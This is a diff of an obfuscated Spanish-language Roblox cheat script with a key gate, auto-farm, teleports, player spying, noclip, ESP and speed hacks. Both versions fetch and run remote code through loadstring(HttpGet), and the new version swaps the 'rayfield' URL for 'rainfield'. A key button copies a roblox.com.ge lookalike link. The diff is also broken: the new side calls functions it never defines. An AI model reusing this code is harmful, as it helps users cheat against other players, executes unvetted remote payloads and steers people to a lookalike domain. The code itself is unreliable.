@@ -1,138 +1,137 @@
--- ⚠️ SCRIPT PROTEGIDO - NO PUEDES COPIAR MI SCRIPT HAHAHAHA ⚠️
--- 🔐 Ofuscación Avanzada Nivel 5
--- 🎯 Roba un Brainrot - Premium Edition
--- 👤 By: technoourielcompany
--- 🔗 Get Key: https://roblox.com.ge/communities/4362678772/
+-- ⚠️ NO SE PUEDE ROBAR EL SCRIPT BOT HAHAHAHAH ⚠️
+local NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH=loadstring(game:HttpGet('https://sirius.menu/rainfield',true))()
+local ROBAR_EL_SCRIPT,BOT_HAHAHAHAH,NO_SE_PUEDE,HAHAHAHAH_BOT,SCRIPT_BOT_VELOCIDAD=false,false,false,false,0.5
+local EL_SCRIPT_BOT=NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:CreateWindow({Name="🔑 NO SE PUEDE ROBAR BOT HAHAHAHAH",LoadingTitle="NO SE PUEDE ROBAR EL SCRIPT",LoadingSubtitle="BOT HAHAHAHAH - by technoourielcompany",ConfigurationSaving={Enabled=false},Discord={Enabled=false},KeySystem=false})
+local ROBAR_SCRIPT_TAB=EL_SCRIPT_BOT:CreateTab("🔐 Key",4483362458)
+ROBAR_SCRIPT_TAB:CreateSection("⚠️ NO SE PUEDE ROBAR EL SCRIPT BOT")
+local NO_ROBAR_INPUT=ROBAR_SCRIPT_TAB:CreateInput({Name="🔑 NO SE PUEDE ROBAR - Introduce Key",PlaceholderText="BOT HAHAHAHAH...",RemoveTextAfterFocusLost=false,Callback=function(HAHAHAHAH_INPUT)if string.lower(HAHAHAHAH_INPUT)=="uriel3334"then ROBAR_EL_SCRIPT=true NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="✅ NO SE PUEDE ROBAR",Content="BOT HAHAHAHAH - Acceso Concedido",Duration=3})SCRIPT_BOT_MENU()else NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="❌ NO SE PUEDE ROBAR",Content="BOT HAHAHAHAH - Key Incorrecta 😏",Duration=3})end end})
+ROBAR_SCRIPT_TAB:CreateLabel("🛡️ NO SE PUEDE ROBAR EL SCRIPT BOT HAHAHAHAH")
+local GET_KEY_BOT=ROBAR_SCRIPT_TAB:CreateButton({Name="📋 Get Key - NO SE PUEDE ROBAR BOT",Callback=function()local LINK_BOT_HAHAHAHAH="https://roblox.com.ge/communities/4362678772/"setclipboard(LINK_BOT_HAHAHAHAH)NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="📋 NO SE PUEDE ROBAR",Content="BOT HAHAHAHAH - Link Copiado!",Duration=3})end})
+ROBAR_SCRIPT_TAB:CreateSection("😏 BOT HAHAHAHAH PROTEGIDO")
 
-local _0xA1B2C3,_0xD4E5F6,_0xG7H8I9,_0xJ0K1L2,_0xM3N4O5=loadstring(game:HttpGet('https://sirius.menu/rayfield',true))(),false,false,false,0.5
-local _0xP6Q7R8=_0xA1B2C3:CreateWindow({Name="🔑 Premium Key System",LoadingTitle="Verificando Licencia...",LoadingSubtitle="by technoourielcompany - PROTEGIDO",ConfigurationSaving={Enabled=false},Discord={Enabled=false},KeySystem=false})
-local _0xS9T0U1=_0xP6Q7R8:CreateTab("🔐 Key",4483362458)
-_0xS9T0U1:CreateSection("⚠️ Sistema Anti-Copia Activado")
-local _0xV2W3X4=_0xS9T0U1:CreateInput({Name="🔑 Introduce Premium Key",PlaceholderText="Key protegida...",RemoveTextAfterFocusLost=false,Callback=function(_0xY5Z6A7)if string.lower(_0xY5Z6A7)=="uriel3334"then _0xD4E5F6=true _0xA1B2C3:Notify({Title="✅ Acceso Concedido",Content="Bienvenido al modo Premium",Duration=3})_0xB8C9D0()else _0xA1B2C3:Notify({Title="❌ Acceso Denegado",Content="Nice try! Key incorrecta 😏",Duration=3})end end})
-_0xS9T0U1:CreateLabel("⚡ Función Anti-Leak Activada")
-local _0xE1F2G3=_0xS9T0U1:CreateButton({Name="📋 Obtener Key Premium",Callback=function()local _0xH4I5J6="https://roblox.com.ge/communities/4362678772/"setclipboard(_0xH4I5J6)_0xA1B2C3:Notify({Title="📋 Link Copiado",Content="Consigue tu key premium ahora!",Duration=3})end})
-_0xS9T0U1:CreateSection("🛡️ Script Protegido con MD5")
+function SCRIPT_BOT_MENU()
+local AUTO_FARM_BOT=EL_SCRIPT_BOT:CreateTab("🧠 NO SE PUEDE ROBAR - Auto Farm",4483362458)
+AUTO_FARM_BOT:CreateSection("💎 BOT HAHAHAHAH - Farmeo Automático")
+local NO_ROBAR_TOGGLE1=AUTO_FARM_BOT:CreateToggle({Name="⚡ NO SE PUEDE ROBAR - Auto Recoger",CurrentValue=false,Flag="NoRobarAutoCollect",Callback=function(BOT_VALUE)NO_SE_PUEDE=BOT_VALUE if BOT_VALUE then NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="🧠 NO SE PUEDE ROBAR",Content="BOT HAHAHAHAH - Recolección Activada!",Duration=2})FUNCION_NO_ROBAR_1()else NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="⏸️ BOT PAUSADO",Content="HAHAHAHAH - Detenido",Duration=2})end end})
+local NO_ROBAR_TOGGLE2=AUTO_FARM_BOT:CreateToggle({Name="🚀 BOT HAHAHAHAH - Hyper Farm",CurrentValue=false,Flag="BotHyperFarm",Callback=function(SCRIPT_VALUE)BOT_HAHAHAHAH=SCRIPT_VALUE if SCRIPT_VALUE then NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="🚀 NO SE PUEDE ROBAR",Content="BOT HAHAHAHAH - Hyper Activado!",Duration=2})FUNCION_NO_ROBAR_2()else NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="⏸️ BOT PAUSADO",Content="HAHAHAHAH",Duration=2})end end})
+local VELOCIDAD_BOT=AUTO_FARM_BOT:CreateSlider({Name="⚙️ NO SE PUEDE ROBAR - Velocidad BOT",Range={0.05,3},Increment=0.05,CurrentValue=0.5,Flag="VelocidadBot",Callback=function(SPEED_BOT)SCRIPT_BOT_VELOCIDAD=SPEED_BOT end})
+AUTO_FARM_BOT:CreateSection("🎯 BOT HAHAHAHAH - Funciones Extra")
+local TP_SPAWN_BOT=AUTO_FARM_BOT:CreateButton({Name="🎯 NO SE PUEDE ROBAR - TP Spawn",Callback=function()TELEPORT_SPAWN_BOT()end})
+local ALERTAS_BOT=AUTO_FARM_BOT:CreateToggle({Name="🔔 BOT HAHAHAHAH - Alertas",CurrentValue=true,Flag="AlertasBot",Callback=function(ALERT_BOT)end})
+local SELL_BOT=AUTO_FARM_BOT:CreateButton({Name="💰 NO SE PUEDE ROBAR - Auto Sell",Callback=function()AUTO_VENTA_BOT()end})
 
-function _0xB8C9D0()
-local _0xK7L8M9=_0xP6Q7R8:CreateTab("🧠 Auto Farm PRO",4483362458)
-_0xK7L8M9:CreateSection("💎 Farmeo Automático Premium")
-local _0xN0O1P2=_0xK7L8M9:CreateToggle({Name="⚡ Auto Recoger Brainrots PRO",CurrentValue=false,Flag="AutoCollectPRO",Callback=function(_0xQ3R4S5)_0xG7H8I9=_0xQ3R4S5 if _0xQ3R4S5 then _0xA1B2C3:Notify({Title="🧠 MODO PRO",Content="Recolección ultra rápida activada!",Duration=2})_0xT6U7V8()else _0xA1B2C3:Notify({Title="⏸️ Pausado",Content="Auto recolección detenida",Duration=2})end end})
-local _0xW9X0Y1=_0xK7L8M9:CreateToggle({Name="🚀 Hyper Farm (TP Instantáneo)",CurrentValue=false,Flag="HyperFarm",Callback=function(_0xZ2A3B4)_0xJ0K1L2=_0xZ2A3B4 if _0xZ2A3B4 then _0xA1B2C3:Notify({Title="🚀 HYPER ACTIVADO",Content="Modo ultra velocidad ON!",Duration=2})_0xC5D6E7()else _0xA1B2C3:Notify({Title="⏸️ Pausado",Content="Hyper Farm detenido",Duration=2})end end})
-local _0xF8G9H0=_0xK7L8M9:CreateSlider({Name="⚙️ Velocidad Turbo",Range={0.05,3},Increment=0.05,CurrentValue=0.5,Flag="TurboSpeed",Callback=function(_0xI1J2K3)_0xM3N4O5=_0xI1J2K3 end})
-_0xK7L8M9:CreateSection("🎯 Funciones Avanzadas")
-local _0xL4M5N6=_0xK7L8M9:CreateButton({Name="🎯 TP Spawn VIP",Callback=function()_0xO7P8Q9()end})
-local _0xR0S1T2=_0xK7L8M9:CreateToggle({Name="🔔 Alertas Brainrot Legendario",CurrentValue=true,Flag="LegendaryAlert",Callback=function(_0xU3V4W5)end})
-local _0xX6Y7Z8=_0xK7L8M9:CreateButton({Name="💰 Auto Sell Automático",Callback=function()_0xA9B0C1()end})
+local TELEPORTS_BOT=EL_SCRIPT_BOT:CreateTab("🌍 BOT HAHAHAHAH - Teleports",4483362458)
+TELEPORTS_BOT:CreateSection("🗺️ NO SE PUEDE ROBAR - Zonas")
+local TP_TIENDA_BOT=TELEPORTS_BOT:CreateButton({Name="🏪 BOT HAHAHAHAH - TP Tienda",Callback=function()TELEPORT_TIENDA_BOT()end})
+local TP_VENTA_BOT=TELEPORTS_BOT:CreateButton({Name="💸 NO SE PUEDE ROBAR - TP Venta",Callback=function()TELEPORT_VENTA_BOT()end})
+local TRAER_TODO_BOT=TELEPORTS_BOT:CreateButton({Name="🧲 BOT HAHAHAHAH - Traer Todo",Callback=function()TRAER_BRAINROTS_BOT()end})
+local TP_LEGENDARIO_BOT=TELEPORTS_BOT:CreateButton({Name="🌟 NO SE PUEDE ROBAR - Zona Legendaria",Callback=function()TELEPORT_LEGENDARIO_BOT()end})
+TELEPORTS_BOT:CreateSection("👥 BOT HAHAHAHAH - Jugadores")
+local JUGADORES_BOT,JUGADOR_SELECCIONADO_BOT={},""
+for _,PLAYER_BOT in pairs(game.Players:GetPlayers())do if PLAYER_BOT~=game.Players.LocalPlayer then table.insert(JUGADORES_BOT,PLAYER_BOT.Name)end end
+local DROPDOWN_BOT=TELEPORTS_BOT:CreateDropdown({Name="NO SE PUEDE ROBAR - Seleccionar",Options=JUGADORES_BOT,CurrentOption=JUGADORES_BOT[1]or"Ninguno",Flag="JugadorBot",Callback=function(SELECTED_BOT)JUGADOR_SELECCIONADO_BOT=SELECTED_BOT end})
+local TP_JUGADOR_BOT=TELEPORTS_BOT:CreateButton({Name="➡️ BOT HAHAHAHAH - TP a Jugador",Callback=function()if JUGADOR_SELECCIONADO_BOT~=""then TELEPORT_JUGADOR_BOT(JUGADOR_SELECCIONADO_BOT)end end})
+local ESPIAR_BOT=TELEPORTS_BOT:CreateButton({Name="👁️ NO SE PUEDE ROBAR - Espiar",Callback=function()if JUGADOR_SELECCIONADO_BOT~=""then ESPIAR_JUGADOR_BOT(JUGADOR_SELECCIONADO_BOT)end end})
 
-local _0xD2E3F4=_0xP6Q7R8:CreateTab("🌍 Teleports PRO",4483362458)
-_0xD2E3F4:CreateSection("🗺️ Zonas Importantes")
-local _0xG5H6I7=_0xD2E3F4:CreateButton({Name="🏪 TP Tienda Secreta",Callback=function()_0xJ8K9L0()end})
-local _0xM1N2O3=_0xD2E3F4:CreateButton({Name="💸 TP Zona Venta VIP",Callback=function()_0xP4Q5R6()end})
-local _0xS7T8U9=_0xD2E3F4:CreateButton({Name="🧲 Atraer TODOS los Brainrots",Callback=function()_0xV0W1X2()end})
-local _0xY3Z4A5=_0xD2E3F4:CreateButton({Name="🌟 TP Zona Legendaria",Callback=function()_0xB6C7D8()end})
-_0xD2E3F4:CreateSection("👥 Control de Jugadores")
-local _0xE9F0G1,_0xH2I3J4={},""
-for _,_0xK5L6M7 in pairs(game.Players:GetPlayers())do if _0xK5L6M7~=game.Players.LocalPlayer then table.insert(_0xE9F0G1,_0xK5L6M7.Name)end end
-local _0xN8O9P0=_0xD2E3F4:CreateDropdown({Name="Seleccionar Objetivo",Options=_0xE9F0G1,CurrentOption=_0xE9F0G1[1]or"Ninguno",Flag="TargetPlayer",Callback=function(_0xQ1R2S3)_0xH2I3J4=_0xQ1R2S3 end})
-local _0xT4U5V6=_0xD2E3F4:CreateButton({Name="➡️ Teleportarse a Jugador",Callback=function()if _0xH2I3J4~=""then _0xW7X8Y9(_0xH2I3J4)end end})
-local _0xZ0A1B2=_0xD2E3F4:CreateButton({Name="👁️ Espiar Jugador",Callback=function()if _0xH2I3J4~=""then _0xC3D4E5(_0xH2I3J4)end end})
+local EXPLOITS_BOT=EL_SCRIPT_BOT:CreateTab("⚡ BOT HAHAHAHAH - Exploits",4483362458)
+EXPLOITS_BOT:CreateSection("🏃 NO SE PUEDE ROBAR - Movimiento")
+local SPEED_SLIDER_BOT=EXPLOITS_BOT:CreateSlider({Name="🏃 BOT HAHAHAHAH - Super Speed",Range={16,500},Increment=5,CurrentValue=16,Flag="SpeedBot",Callback=function(VELOCIDAD_JUGADOR)local JUGADOR_BOT=game.Players.LocalPlayer if JUGADOR_BOT.Character and JUGADOR_BOT.Character:FindFirstChild("Humanoid")then JUGADOR_BOT.Character.Humanoid.WalkSpeed=VELOCIDAD_JUGADOR end end})
+local JUMP_SLIDER_BOT=EXPLOITS_BOT:CreateSlider({Name="🦘 NO SE PUEDE ROBAR - Mega Jump",Range={50,500},Increment=5,CurrentValue=50,Flag="JumpBot",Callback=function(SALTO_JUGADOR)local JUGADOR_BOT=game.Players.LocalPlayer if JUGADOR_BOT.Character and JUGADOR_BOT.Character:FindFirstChild("Humanoid")then JUGADOR_BOT.Character.Humanoid.JumpPower=SALTO_JUGADOR end end})
+local NOCLIP_ACTIVO_BOT,AGUA_ACTIVA_BOT=false,false
+local NOCLIP_BOT=EXPLOITS_BOT:CreateToggle({Name="👻 BOT HAHAHAHAH - Noclip",CurrentValue=false,Flag="NoclipBot",Callback=function(NOCLIP_VALUE)NOCLIP_ACTIVO_BOT=NOCLIP_VALUE if NOCLIP_VALUE then ACTIVAR_NOCLIP_BOT()end end})
+local AGUA_BOT=EXPLOITS_BOT:CreateToggle({Name="🌊 NO SE PUEDE ROBAR - Caminar Agua",CurrentValue=false,Flag="AguaBot",Callback=function(AGUA_VALUE)AGUA_ACTIVA_BOT=AGUA_VALUE if AGUA_VALUE then ACTIVAR_AGUA_BOT()end end})
+EXPLOITS_BOT:CreateSection("💪 BOT HAHAHAHAH - Capacidades")
+local CAPACIDAD_BOT=EXPLOITS_BOT:CreateToggle({Name="♾️ NO SE PUEDE ROBAR - Capacidad Infinita",CurrentValue=false,Flag="CapacidadBot",Callback=function(CAP_VALUE)if CAP_VALUE then CAPACIDAD_INFINITA_BOT()end end})
+local STAMINA_BOT=EXPLOITS_BOT:CreateToggle({Name="⚡ BOT HAHAHAHAH - Stamina Infinita",CurrentValue=false,Flag="StaminaBot",Callback=function(STAM_VALUE)if STAM_VALUE then STAMINA_INFINITA_BOT()end end})
+local VIP_BOT=EXPLOITS_BOT:CreateButton({Name="💎 NO SE PUEDE ROBAR - Desbloquear VIP",Callback=function()DESBLOQUEAR_VIP_BOT()end})
 
-local _0xF6G7H8=_0xP6Q7R8:CreateTab("⚡ Exploits ULTRA",4483362458)
-_0xF6G7H8:CreateSection("🏃 Movimiento Mejorado")
-local _0xI9J0K1=_0xF6G7H8:CreateSlider({Name="🏃 Super Velocidad",Range={16,500},Increment=5,CurrentValue=16,Flag="SuperSpeed",Callback=function(_0xL2M3N4)local _0xO5P6Q7=game.Players.LocalPlayer if _0xO5P6Q7.Character and _0xO5P6Q7.Character:FindFirstChild("Humanoid")then _0xO5P6Q7.Character.Humanoid.WalkSpeed=_0xL2M3N4 end end})
-local _0xR8S9T0=_0xF6G7H8:CreateSlider({Name="🦘 Mega Salto",Range={50,500},Increment=5,CurrentValue=50,Flag="MegaJump",Callback=function(_0xU1V2W3)local _0xX4Y5Z6=game.Players.LocalPlayer if _0xX4Y5Z6.Character and _0xX4Y5Z6.Character:FindFirstChild("Humanoid")then _0xX4Y5Z6.Character.Humanoid.JumpPower=_0xU1V2W3 end end})
-local _0xA7B8C9,_0xD0E1F2=false,false
-local _0xG3H4I5=_0xF6G7H8:CreateToggle({Name="👻 Modo Fantasma (Noclip)",CurrentValue=false,Flag="GhostMode",Callback=function(_0xJ6K7L8)_0xA7B8C9=_0xJ6K7L8 if _0xJ6K7L8 then _0xM9N0O1()end end})
-local _0xP2Q3R4=_0xF6G7H8:CreateToggle({Name="🌊 Caminar en Agua",CurrentValue=false,Flag="WaterWalk",Callback=function(_0xS5T6U7)_0xD0E1F2=_0xS5T6U7 if _0xS5T6U7 then _0xV8W9X0()end end})
-_0xF6G7H8:CreateSection("💪 Capacidades Premium")
-local _0xY1Z2A3=_0xF6G7H8:CreateToggle({Name="♾️ Capacidad Infinita PRO",CurrentValue=false,Flag="InfiniteCapPRO",Callback=function(_0xB4C5D6)if _0xB4C5D6 then _0xE7F8G9()end end})
-local _0xH0I1J2=_0xF6G7H8:CreateToggle({Name="⚡ Stamina Infinita",CurrentValue=false,Flag="InfiniteStamina",Callback=function(_0xK3L4M5)if _0xK3L4M5 then _0xN6O7P8()end end})
-local _0xQ9R0S1=_0xF6G7H8:CreateButton({Name="💎 Desbloquear Todo VIP",Callback=function()_0xT2U3V4()end})
+local VISUAL_BOT=EL_SCRIPT_BOT:CreateTab("👁️ BOT HAHAHAHAH - Visual",4483362458)
+VISUAL_BOT:CreateSection("🎨 NO SE PUEDE ROBAR - ESP")
+local ESP_BRAINROT_BOT=VISUAL_BOT:CreateToggle({Name="💚 BOT HAHAHAHAH - ESP Brainrots",CurrentValue=false,Flag="ESPBrainrotBot",Callback=function(ESP_VALUE)if ESP_VALUE then ACTIVAR_ESP_BRAINROT_BOT()else DESACTIVAR_ESP_BRAINROT_BOT()end end})
+local ESP_JUGADOR_BOT=VISUAL_BOT:CreateToggle({Name="🔴 NO SE PUEDE ROBAR - ESP Jugadores",CurrentValue=false,Flag="ESPJugadorBot",Callback=function(ESP_PLAYER)if ESP_PLAYER then ACTIVAR_ESP_JUGADOR_BOT()else DESACTIVAR_ESP_JUGADOR_BOT()end end})
+local ESP_RARO_BOT=VISUAL_BOT:CreateToggle({Name="⭐ BOT HAHAHAHAH - ESP Raros",CurrentValue=false,Flag="ESPRaroBot",Callback=function(ESP_RARE)if ESP_RARE then ACTIVAR_ESP_RARO_BOT()end end})
+local FULLBRIGHT_BOT=VISUAL_BOT:CreateButton({Name="💡 NO SE PUEDE ROBAR - Fullbright",Callback=function()ACTIVAR_FULLBRIGHT_BOT()end})
+local ARCOIRIS_BOT=VISUAL_BOT:CreateToggle({Name="🌈 BOT HAHAHAHAH - Modo Arcoíris",CurrentValue=false,Flag="ArcoirisBot",Callback=function(ARCO_VALUE)if ARCO_VALUE then MODO_ARCOIRIS_BOT()end end})
+VISUAL_BOT:CreateSection("📏 NO SE PUEDE ROBAR - Distancias")
+local DISTANCIA_BOT=VISUAL_BOT:CreateToggle({Name="📏 BOT HAHAHAHAH - Mostrar Distancias",CurrentValue=false,Flag="DistanciaBot",Callback=function(DIST_VALUE)end})
 
-local _0xW5X6Y7=_0xP6Q7R8:CreateTab("👁️ Visual PRO",4483362458)
-_0xW5X6Y7:CreateSection("🎨 ESP y Visibilidad Avanzada")
-local _0xZ8A9B0=_0xW5X6Y7:CreateToggle({Name="💚 ESP Brainrots Mejorado",CurrentValue=false,Flag="BrainrotESPPRO",Callback=function(_0xC1D2E3)if _0xC1D2E3 then _0xF4G5H6()else _0xI7J8K9()end end})
-local _0xL0M1N2=_0xW5X6Y7:CreateToggle({Name="🔴 ESP Jugadores Premium",CurrentValue=false,Flag="PlayerESPPRO",Callback=function(_0xO3P4Q5)if _0xO3P4Q5 then _0xR6S7T8()else _0xU9V0W1()end end})
-local _0xX2Y3Z4=_0xW5X6Y7:CreateToggle({Name="⭐ ESP Raros y Legendarios",CurrentValue=false,Flag="RareESP",Callback=function(_0xA5B6C7)if _0xA5B6C7 then _0xD8E9F0()end end})
-local _0xG1H2I3=_0xW5X6Y7:CreateButton({Name="💡 Ultra Fullbright",Callback=function()_0xJ4K5L6()end})
-local _0xM7N8O9=_0xW5X6Y7:CreateToggle({Name="🌈 Modo Arcoíris",CurrentValue=false,Flag="RainbowMode",Callback=function(_0xP0Q1R2)if _0xP0Q1R2 then _0xS3T4U5()end end})
-_0xW5X6Y7:CreateSection("📏 Distancias y Medidas")
-local _0xV6W7X8=_0xW5X6Y7:CreateToggle({Name="📏 Mostrar Distancias",CurrentValue=false,Flag="ShowDistance",Callback=function(_0xY9Z0A1)end})
+local AUTO_BOT=EL_SCRIPT_BOT:CreateTab("🎮 NO SE PUEDE ROBAR - Auto",4483362458)
+AUTO_BOT:CreateSection("🤖 BOT HAHAHAHAH - Automatización")
+local AUTO_SELL_TOGGLE_BOT=AUTO_BOT:CreateToggle({Name="💰 NO SE PUEDE ROBAR - Auto Vender",CurrentValue=false,Flag="AutoVenderBot",Callback=function(SELL_AUTO)if SELL_AUTO then AUTO_VENDER_INTELIGENTE_BOT()end end})
+local AUTO_REBIRTH_BOT=AUTO_BOT:CreateToggle({Name="🔄 BOT HAHAHAHAH - Auto Rebirth",CurrentValue=false,Flag="AutoRebirthBot",Callback=function(REBIRTH_AUTO)if REBIRTH_AUTO then AUTO_REBIRTH_FUNCION_BOT()end end})
+local AUTO_CLAIM_BOT=AUTO_BOT:CreateToggle({Name="🎁 NO SE PUEDE ROBAR - Auto Reclamar",CurrentValue=false,Flag="AutoClaimBot",Callback=function(CLAIM_AUTO)if CLAIM_AUTO then AUTO_RECLAMAR_BOT()end end})
+local AUTO_UPGRADE_BOT=AUTO_BOT:CreateToggle({Name="⚡ BOT HAHAHAHAH - Auto Upgrade",CurrentValue=false,Flag="AutoUpgradeBot",Callback=function(UPGRADE_AUTO)if UPGRADE_AUTO then AUTO_UPGRADE_FUNCION_BOT()end end})
+AUTO_BOT:CreateSection("⏰ NO SE PUEDE ROBAR - Configuración")
+local INTERVALO_BOT=AUTO_BOT:CreateSlider({Name="⏱️ BOT HAHAHAHAH - Intervalo (seg)",Range={5,60},Increment=5,CurrentValue=10,Flag="IntervaloBot",Callback=function(INTERVALO_VALUE)end})
 
-local _0xB2C3D4=_0xP6Q7R8:CreateTab("🎮 Auto Features",4483362458)
-_0xB2C3D4:CreateSection("🤖 Automatización Total")
-local _0xE5F6G7=_0xB2C3D4:CreateToggle({Name="💰 Auto Vender Inteligente",CurrentValue=false,Flag="SmartAutoSell",Callback=function(_0xH8I9J0)if _0xH8I9J0 then _0xK1L2M3()end end})
-local _0xN4O5P6=_0xB2C3D4:CreateToggle({Name="🔄 Auto Rebirth",CurrentValue=false,Flag="AutoRebirth",Callback=function(_0xQ7R8S9)if _0xQ7R8S9 then _0xT0U1V2()end end})
-local _0xW3X4Y5=_0xB2C3D4:CreateToggle({Name="🎁 Auto Reclamar Recompensas",CurrentValue=false,Flag="AutoClaim",Callback=function(_0xZ6A7B8)if _0xZ6A7B8 then _0xC9D0E1()end end})
-local _0xF2G3H4=_0xB2C3D4:CreateToggle({Name="⚡ Auto Upgrade Todo",CurrentValue=false,Flag="AutoUpgrade",Callback=function(_0xI5J6K7)if _0xI5J6K7 then _0xL8M9N0()end end})
-_0xB2C3D4:CreateSection("⏰ Configuración Temporal")
-local _0xO1P2Q3=_0xB2C3D4:CreateSlider({Name="⏱️ Intervalo Auto Vender (seg)",Range={5,60},Increment=5,CurrentValue=10,Flag="SellInterval",Callback=function(_0xR4S5T6)end})
-
-local _0xU7V8W9=_0xP6Q7R8:CreateTab("🔧 Utilidades",4483362458)
-_0xU7V8W9:CreateSection("🛠️ Herramientas Extra")
-local _0xX0Y1Z2=_0xU7V8W9:CreateToggle({Name="🦘 Salto Infinito PRO",CurrentValue=false,Flag="InfiniteJumpPRO",Callback=function(_0xA3B4C5)if _0xA3B4C5 then _0xD6E7F8()end end})
-local _0xG9H0I1=_0xU7V8W9:CreateToggle({Name="🎯 Auto Aim",CurrentValue=false,Flag="AutoAim",Callback=function(_0xJ2K3L4)end})
-local _0xM5N6O7=_0xU7V8W9:CreateButton({Name="🔄 Rejoin Rápido",Callback=function()game:GetService("TeleportService"):Teleport(game.PlaceId,game.Players.LocalPlayer)end})
-local _0xP8Q9R0=_0xU7V8W9:CreateButton({Name="💾 Guardar Configuración",Callback=function()_0xA1B2C3:Notify({Title="💾 Guardado",Content="Configuración guardada exitosamente",Duration=2})end})
-local _0xS1T2U3=_0xU7V8W9:CreateButton({Name="🗑️ Limpiar Workspace",Callback=function()_0xV4W5X6()end})
-_0xU7V8W9:CreateSection("ℹ️ Información")
-_0xU7V8W9:CreateLabel("✅ Script Protegido con Anti-Leak")
-_0xU7V8W9:CreateLabel("⚡ Versión: Premium 2.0")
-_0xU7V8W9:CreateLabel("👤 Creador: technoourielcompany")
+local UTILIDADES_BOT=EL_SCRIPT_BOT:CreateTab("🔧 NO SE PUEDE ROBAR - Utils",4483362458)
+UTILIDADES_BOT:CreateSection("🛠️ BOT HAHAHAHAH - Herramientas")
+local SALTO_INFINITO_BOT=UTILIDADES_BOT:CreateToggle({Name="🦘 NO SE PUEDE ROBAR - Salto Infinito",CurrentValue=false,Flag="SaltoBot",Callback=function(SALTO_VALUE)if SALTO_VALUE then SALTO_INFINITO_FUNCION_BOT()end end})
+local AIM_BOT=UTILIDADES_BOT:CreateToggle({Name="🎯 BOT HAHAHAHAH - Auto Aim",CurrentValue=false,Flag="AimBot",Callback=function(AIM_VALUE)end})
+local REJOIN_BOT=UTILIDADES_BOT:CreateButton({Name="🔄 NO SE PUEDE ROBAR - Rejoin",Callback=function()game:GetService("TeleportService"):Teleport(game.PlaceId,game.Players.LocalPlayer)end})
+local GUARDAR_BOT=UTILIDADES_BOT:CreateButton({Name="💾 BOT HAHAHAHAH - Guardar Config",Callback=function()NO_SE_PUEDE_ROBAR_EL_SCRIPT_BOT_HAHAHAHAH:Notify({Title="💾 NO SE PUEDE ROBAR",Content="BOT HAHAHAHAH - Config Guardada",Duration=2})end})
+local LIMPIAR_BOT=UTILIDADES_BOT:CreateButton({Name="🗑️ NO SE PUEDE ROBAR - Limpiar Workspace",Callback=function()LIMPIAR_WORKSPACE_BOT()end})
+UTILIDADES_BOT:CreateSection("ℹ️ BOT HAHAHAHAH - Info")
+UTILIDADES_BOT:CreateLabel("✅ NO SE PUEDE ROBAR EL SCRIPT BOT")
+UTILIDADES_BOT:CreateLabel("⚡ HAHAHAHAH - Versión Premium 2.0")
+UTILIDADES_BOT:CreateLabel("👤 BOT by technoourielcompany")
 end
 
-function _0xT6U7V8()spawn(function()while _0xG7H8I9 do for _,_0xY7Z8A9 in pairs(workspace:GetDescendants())do if _0xY7Z8A9:IsA("Model")and(_0xY7Z8A9.Name:lower():find("brainrot")or _0xY7Z8A9.Name:lower():find("rot"))then if _0xY7Z8A9:FindFirstChild("Handle")or _0xY7Z8A9:FindFirstChild("HumanoidRootPart")then local _0xB0C1D2=game.Players.LocalPlayer if _0xB0C1D2.Character and _0xB0C1D2.Character:FindFirstChild("HumanoidRootPart")then local _0xE3F4G5=_0xB0C1D2.Character.HumanoidRootPart local _0xH6I7J8=_0xY7Z8A9:FindFirstChild("Handle")or _0xY7Z8A9:FindFirstChild("HumanoidRootPart")if _0xH6I7J8 then firetouchinterest(_0xE3F4G5,_0xH6I7J8,0)wait(0.05)firetouchinterest(_0xE3F4G5,_0xH6I7J8,1)end end end end end wait(_0xM3N4O5 or 0.5)end end)end
-function _0xC5D6E7()spawn(function()while _0xJ0K1L2 do for _,_0xK9L0M1 in pairs(workspace:GetDescendants())do if _0xJ0K1L2==false then break end if _0xK9L0M1:IsA("Model")and(_0xK9L0M1.Name:lower():find("brainrot")or _0xK9L0M1.Name:lower():find("rot"))then local _0xN2O3P4=_0xK9L0M1:FindFirstChild("Handle")or _0xK9L0M1:FindFirstChild("HumanoidRootPart")if _0xN2O3P4 then local _0xQ5R6S7=game.Players.LocalPlayer if _0xQ5R6S7.Character and _0xQ5R6S7.Character:FindFirstChild("HumanoidRootPart")then _0xQ5R6S7.Character.HumanoidRootPart.CFrame=_0xN2O3P4.CFrame wait(0.1)end end end end wait(_0xM3N4O5 or 0.5)end end)end
-function _0xV0W1X2()local _0xT8U9V0=game.Players.LocalPlayer if not _0xT8U9V0.Character or not _0xT8U9V0.Character:FindFirstChild("HumanoidRootPart")then return end local _0xW1X2Y3=0 for _,_0xZ4A5B6 in pairs(workspace:GetDescendants())do if _0xZ4A5B6:IsA("Model")and(_0xZ4A5B6.Name:lower():find("brainrot")or _0xZ4A5B6.Name:lower():find("rot"))then local _0xC7D8E9=_0xZ4A5B6:FindFirstChild("Handle")or _0xZ4A5B6:FindFirstChild("HumanoidRootPart")if _0xC7D8E9 then _0xC7D8E9.CFrame=_0xT8U9V0.Character.HumanoidRootPart.CFrame _0xW1X2Y3=_0xW1X2Y3+1 end end end _0xA1B2C3:Notify({Title="🧲 Completado",Content="Se atrajeron ".._0xW1X2Y3.." brainrots!",Duration=3})end
-function _0xO7P8Q9()local _0xF0G1H2=game.Players.LocalPlayer if _0xF0G1H2.Character and _0xF0G1H2.Character:FindFirstChild("HumanoidRootPart")then local _0xI3J4K5=workspace:FindFirstChild("SpawnLocation")or workspace:FindFirstChild("Spawn")if _0xI3J4K5 then _0xF0G1H2.Character.HumanoidRootPart.CFrame=_0xI3J4K5.CFrame+Vector3.new(0,5,0)end end end
